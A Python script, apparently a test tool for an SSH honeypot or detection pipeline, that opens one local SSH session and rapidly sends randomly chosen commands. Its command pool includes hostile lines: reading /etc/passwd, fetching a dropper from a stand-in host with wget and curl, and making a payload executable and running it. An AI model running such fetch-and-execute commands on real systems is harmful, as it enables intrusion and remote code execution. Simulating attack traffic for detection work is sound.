"""Run one SSH session with very low duration and high command volume.

Usage:
    python scripts/simulate_single_high_intensity.py
"""

from __future__ import annotations

import random
import socket
import time

import paramiko

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2222
USERNAME = "stress-user"
PASSWORD = "stress-pass"

# Tune these values for desired feature profile.
COMMANDS_COUNT = 120
INTER_COMMAND_DELAY_SECONDS = 0.005

# Short, valid commands keep throughput high.
COMMAND_POOL = [
    "ls",
    "pwd",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://evil.local/dropper.sh",
    "curl http://198.51.100.1/a",
    "chmod +x payload.sh",
    "bash payload.sh",
]



def _drain_channel(channel: paramiko.Channel, duration_seconds: float = 0.2) -> None:
    """Read pending output briefly to avoid leaving unread data on close."""
    deadline = time.time() + duration_seconds
    while time.time() < deadline:
        if not channel.recv_ready():
            time.sleep(0.01)
            continue
        try:
            channel.recv(4096)
        except Exception:
            break



def run_high_intensity_session() -> None:
    transport = None
    channel = None
    started_at = time.time()

    try:
        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5)
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=5)
        transport.auth_password(username=USERNAME, password=PASSWORD)

        channel = transport.open_session(timeout=5)
        channel.get_pty()
        channel.invoke_shell()

        # Quick warm-up so server sends initial prompt.
        time.sleep(0.08)
        _drain_channel(channel, duration_seconds=0.08)

        for _ in range(COMMANDS_COUNT):
            command = random.choice(COMMAND_POOL)
            channel.send(command + "\n")
            if INTER_COMMAND_DELAY_SECONDS > 0:
                time.sleep(INTER_COMMAND_DELAY_SECONDS)

        channel.send("exit\n")
        _drain_channel(channel, duration_seconds=0.25)

    except Exception as exc:
        print(f"high-intensity simulation error: {exc}")
    finally:
        if channel is not None:
            channel.close()
        if transport is not None:
            transport.close()

    elapsed = max(time.time() - started_at, 0.001)
    estimated_activity_intensity = COMMANDS_COUNT / elapsed

    print("Single high-intensity SSH simulation complete")
    print(f"Commands sent: {COMMANDS_COUNT}")
    print(f"Approx duration: {elapsed:.3f}s")
    print(f"Approx activity_intensity: {estimated_activity_intensity:.2f} commands/sec")



def main() -> None:
    run_high_intensity_session()


if __name__ == "__main__":
    main()
